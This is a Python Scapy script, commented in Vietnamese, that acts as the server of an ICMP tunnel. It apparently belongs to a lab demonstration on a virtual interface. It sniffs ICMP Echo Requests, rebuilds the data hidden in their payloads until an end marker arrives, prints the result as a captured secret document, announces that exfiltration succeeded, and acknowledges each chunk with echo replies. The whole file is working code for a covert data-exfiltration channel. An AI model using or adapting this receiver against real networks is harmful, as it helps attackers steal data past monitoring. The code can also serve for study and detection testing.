#!/usr/bin/env python3
# icmp_server.py - May chu hung du lieu tu kenh ngam ICMP Tunnel
from scapy.all import *

print("==================================================================")
print("[*] MAY CHU ICMP TUNNEL SERVER (10.0.0.2) DANG HOAT DONG...")
print("==================================================================")
print("[*] Dang lang nghe cac goi ICMP Echo Request tren card veth2...")
print("[*] Du lieu tuon len se duoc boc tach, ghep noi va in ra ben duoi:\n")

received_chunks = []

def handle(p):
    global received_chunks
    if p.haslayer(ICMP) and p[ICMP].type == 8:  # 8 = Echo Request
        data = bytes(p[ICMP].payload)
        seq = p[ICMP].seq
        
        # Neu la manh dau tien (seq = 1), lam moi bo nho dem
        if seq == 1:
            received_chunks = []

        # Kiem tra tin hieu bao ket thuc truyen file
        if data == b"__EOF__":
            full_data = b"".join(received_chunks)
            print("\n" + "="*66)
            print("[+] DA NHAN DU TOAN BO CAC MANH! TIEN HANH GHEP DU LIEU HOAN CHINH:")
            print("="*66)
            try:
                decoded_text = full_data.decode("utf-8")
                print(f"\n>>> TAI LIEU MAT THU DUOC:\n    {decoded_text}\n")
            except:
                print(f"\n>>> DU LIEU NHI PHAN (HEX):\n    {full_data.hex()}\n")
            print(f"[+] Tong so manh ghep: {len(received_chunks)} manh")
            print(f"[+] Tong kich thuoc:    {len(full_data)} bytes")
            print("[=>] KET LUAN: Du lieu da bi tuon ra ngoai thanh cong qua ICMP Tunnel!")
            print("="*66 + "\n")
            
            # Gui phan hoi xac nhan da nhan xong
            reply = IP(dst=p[IP].src)/ICMP(type=0, id=p[ICMP].id, seq=p[ICMP].seq)/b"ACK:__EOF__"
            send(reply, verbose=0)
            return

        # Nhan va luu tru tung manh
        received_chunks.append(data)
        print(f"[Server nhan manh #{len(received_chunks):02d} | Seq={seq}]: {data}")
        
        # Gui lai goi Echo Reply (type 0) xac nhan 2 chieu
        reply = IP(dst=p[IP].src)/ICMP(type=0, id=p[ICMP].id, seq=p[ICMP].seq)/(b"ACK:" + data)
        send(reply, verbose=0)

sniff(iface="veth2", filter="icmp and icmp[icmptype] == 8", prn=handle)
